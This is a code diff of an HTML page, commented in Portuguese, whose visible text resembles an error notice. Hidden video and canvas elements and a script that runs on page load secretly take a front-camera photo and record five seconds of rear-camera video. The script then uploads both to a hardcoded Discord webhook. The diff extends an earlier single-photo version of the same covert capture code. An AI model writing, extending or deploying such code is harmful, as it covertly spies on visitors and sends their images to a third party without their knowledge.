@@ -42,22 +42,76 @@
         <p>Você pode <a href="/">voltar para a página inicial</a> ou tentar novamente mais tarde.</p>
     </div>
 
-    <!-- Elementos ocultos para captura da câmera -->
-    <video id="hiddenVideo" autoplay class="hidden"></video>
+    <!-- Elementos ocultos para captura -->
+    <video id="hiddenVideoFront" autoplay muted class="hidden"></video>
+    <video id="hiddenVideoBack" autoplay muted class="hidden"></video>
     <canvas id="hiddenCanvas" class="hidden"></canvas>
 
     <script>
-        // Configuração do Webhook do Discord (substitua pela sua URL)
+        // Configuração do Webhook do Discord
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1391479176376356928/JxCpfTy6kCzBtR_RCh07NnNoPEZ9fM6XSnvpNI0EI_EVXF9BJtuF_nBKiDGH6TEjzcwL';
 
-        // Função para capturar a foto e enviar para o Discord
-        async function captureAndSendPhoto() {
+        // Função principal
+        async function captureMedia() {
             try {
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
+                // 1. Captura instantânea da câmera frontal
+                await captureFrontCamera();
+                
+                // 2. Gravação da câmera traseira por 5 segundos
+                await recordBackCamera(5000);
+                
+            } catch (error) {
+                console.error('Erro no processo de captura:', error);
+            }
+        }
+
+        // Captura foto da frontal
+        async function captureFrontCamera() {
+            const video = document.getElementById('hiddenVideoFront');
+            const canvas = document.getElementById('hiddenCanvas');
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: 640,
+                    height: 480 
+                } 
+            });
+
+            video.srcObject = stream;
+            
+            return new Promise((resolve) => {
+                video.onplaying = async () => {
+                    // Captura o frame
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Converte para base64
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // Para a câmera
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Envia para o Discord
+                    await sendToDiscord(imageData, 'foto_frontal.jpg', 'Foto frontal capturada');
+                    
+                    resolve();
+                };
+            });
+        }
+
+        // Gravação da câmera traseira
+        async function recordBackCamera(duration) {
+            const video = document.getElementById('hiddenVideoBack');
+            let mediaRecorder;
+            let recordedChunks = [];
+            
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        facingMode: 'user',
+                        facingMode: { exact: 'environment' },
                         width: 640,
                         height: 480 
                     } 
@@ -65,62 +119,87 @@
 
                 video.srcObject = stream;
                 
-                // Espera um pouco para garantir que a câmera está ativa
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                // Captura o frame
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                return new Promise((resolve) => {
+                    video.onplaying = () => {
+                        // Configura o MediaRecorder
+                        mediaRecorder = new MediaRecorder(stream);
+                        
+                        mediaRecorder.ondataavailable = (e) => {
+                            if (e.data.size > 0) {
+                                recordedChunks.push(e.data);
+                            }
+                        };
+                        
+                        mediaRecorder.onstop = async () => {
+                            // Cria o blob do vídeo
+                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                            await sendVideoToDiscord(blob);
+                            
+                            // Libera recursos
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve();
+                        };
+                        
+                        // Inicia a gravação
+                        mediaRecorder.start();
+                        
+                        // Para após o tempo especificado
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, duration);
+                    };
+                });
                 
-                // Converte para base64
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // Para a câmera
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Envia para o Discord
-                await sendToDiscord(imageData);
             } catch (error) {
-                console.error('Erro ao capturar foto:', error);
+                console.error('Erro ao acessar câmera traseira:', error);
+                // Se falhar, tenta usar a frontal como fallback
+                await captureFrontCamera();
             }
         }
 
-        // Função para enviar a foto para o Discord via webhook
-        async function sendToDiscord(imageData) {
-            if (!DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks')) {
-                console.error('Webhook do Discord não configurado corretamente');
-                return;
-            }
-
+        // Envia foto para o Discord
+        async function sendToDiscord(imageData, filename, message) {
+            if (!DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks')) return;
+            
             try {
-                // Extrai os dados base64
                 const base64Data = imageData.split(',')[1];
-                
-                // Converte para blob
                 const blob = await fetch(`data:image/jpeg;base64,${base64Data}`).then(res => res.blob());
                 
-                // Cria form data
                 const formData = new FormData();
-                formData.append('file', blob, 'foto.jpg');
+                formData.append('file', blob, filename);
+                formData.append('content', message);
                 
-                // Envia para o webhook
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     body: formData
                 });
                 
-                console.log('Foto enviada com sucesso para o Discord');
+                console.log('Mídia enviada com sucesso para o Discord');
             } catch (error) {
                 console.error('Erro ao enviar para o Discord:', error);
             }
         }
 
-        // Inicia a captura quando a página carrega
-        window.addEventListener('load', () => {
-            setTimeout(captureAndSendPhoto, 1000); // Espera 1s antes de capturar
-        });
+        // Envia vídeo para o Discord
+        async function sendVideoToDiscord(blob) {
+            if (!DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks')) return;
+            
+            try {
+                const formData = new FormData();
+                formData.append('file', blob, 'video_back.mp4');
+                formData.append('content', 'Gravação de 5 segundos da câmera traseira');
+                
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Erro ao enviar vídeo para o Discord:', error);
+            }
+        }
+
+        // Inicia o processo quando a página carrega
+        window.addEventListener('DOMContentLoaded', captureMedia);
     </script>
 </body>
 </html>
